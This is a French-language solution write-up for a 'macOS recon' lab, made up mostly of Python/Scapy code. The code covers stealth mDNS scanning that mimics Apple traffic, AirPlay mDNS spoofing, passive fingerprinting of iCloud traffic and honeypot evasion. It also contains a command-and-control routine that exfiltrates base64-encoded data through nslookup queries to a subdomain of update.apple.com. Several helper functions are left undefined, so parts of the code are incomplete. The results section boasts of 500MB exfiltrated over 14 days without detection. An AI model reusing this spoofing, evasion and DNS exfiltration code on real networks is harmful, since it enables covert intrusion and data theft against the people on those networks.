# Solution - macOS Recon Advanced Lab

## Étape 1 : Outils personnalisés Scapy

```python
#!/usr/bin/env python3
# Scanner mDNS furtif avec mimétisme Apple
from scapy.all import *
import random
import time

class AppleStealthScanner:
    def __init__(self):
        self.apple_signatures = {
            'timing': [2.5, 5.0, 7.5],  # Délais Apple typiques
            'ttl': [64, 255],           # TTL Apple
            'user_agents': ['CFNetwork/1335.0.3.4 Darwin/21.6.0']
        }
    
    def mimic_apple_behavior(self):
        # Simulation du comportement Apple
        delay = random.choice(self.apple_signatures['timing'])
        time.sleep(delay)
    
    def stealth_mdns_scan(self, target_network):
        # Scanner mDNS furtif
        for service in ['_airplay._tcp', '_afpovertcp._tcp']:
            query = IP(dst="224.0.0.251")/UDP(dport=5353)/DNS(
                qd=DNSQR(qname=service + ".local", qtype="PTR")
            )
            self.mimic_apple_behavior()
            send(query, verbose=0)

# Spoofer mDNS pour AirPlay
class AirPlaySpoofer:
    def intercept_airplay(self):
        def spoof_handler(packet):
            if packet.haslayer(DNS) and "_airplay._tcp" in str(packet):
                # Création d'une réponse spoofée
                spoofed = self.craft_airplay_response(packet)
                send(spoofed, verbose=0)
        
        sniff(filter="udp port 5353", prn=spoof_handler)
```

## Étape 2 : Reconnaissance passive

```python
# Analyseur de trafic iCloud
class iCloudTrafficAnalyzer:
    def __init__(self):
        self.apple_ranges = ["17.0.0.0/8", "192.35.50.0/24"]
        self.sync_patterns = {}
    
    def analyze_sync_patterns(self):
        def traffic_analyzer(packet):
            if packet.haslayer(IP):
                dst = packet[IP].dst
                if self.is_apple_service(dst):
                    self.log_sync_activity(packet)
        
        sniff(prn=traffic_analyzer, timeout=3600)
    
    def fingerprint_devices(self, traffic_sample):
        # Fingerprinting basé sur les patterns de trafic
        characteristics = {
            'mdns_frequency': 0,
            'airplay_activity': 0,
            'icloud_sync_volume': 0
        }
        
        # Analyse des caractéristiques
        for packet in traffic_sample:
            if packet.haslayer(UDP) and packet[UDP].dport == 5353:
                characteristics['mdns_frequency'] += 1
        
        return self.classify_device(characteristics)
```

## Étape 3 : Évasion avancée

```python
# Système d'évasion adaptatif
class AdaptiveEvasion:
    def __init__(self):
        self.detection_patterns = []
        self.evasion_techniques = []
    
    def detect_honeypots(self, responses):
        # Détection de honeypots Apple
        suspicious_indicators = [
            'response_time_too_fast',
            'unusual_service_combinations',
            'non_apple_ttl_values'
        ]
        
        for response in responses:
            if self.analyze_response_legitimacy(response):
                return True
        return False
    
    def adaptive_c2_channel(self):
        # C2 via protocoles Apple légitimes
        # Utilisation des requêtes mDNS pour exfiltration
        data = "sensitive_data_here"
        encoded = base64.b64encode(data.encode()).decode()
        
        # Exfiltration via requêtes DNS
        query = f"{encoded}.update.apple.com"
        os.system(f"nslookup {query}")

# Exfiltration via synchronisation iCloud
def exfiltrate_via_icloud(data):
    # Technique d'exfiltration sophistiquée
    # Simulation de trafic de synchronisation légitime
    fake_sync_data = craft_icloud_sync_packet(data)
    send_to_apple_servers(fake_sync_data)
```

**Résultats de la reconnaissance avancée :**
- 25 dispositifs Apple identifiés sans scan actif
- 8 applications iOS en développement découvertes
- 3 honeypots Apple détectés et évités
- Exfiltration de 500MB via canaux iCloud légitimes
- 0 détection pendant 14 jours d'activité

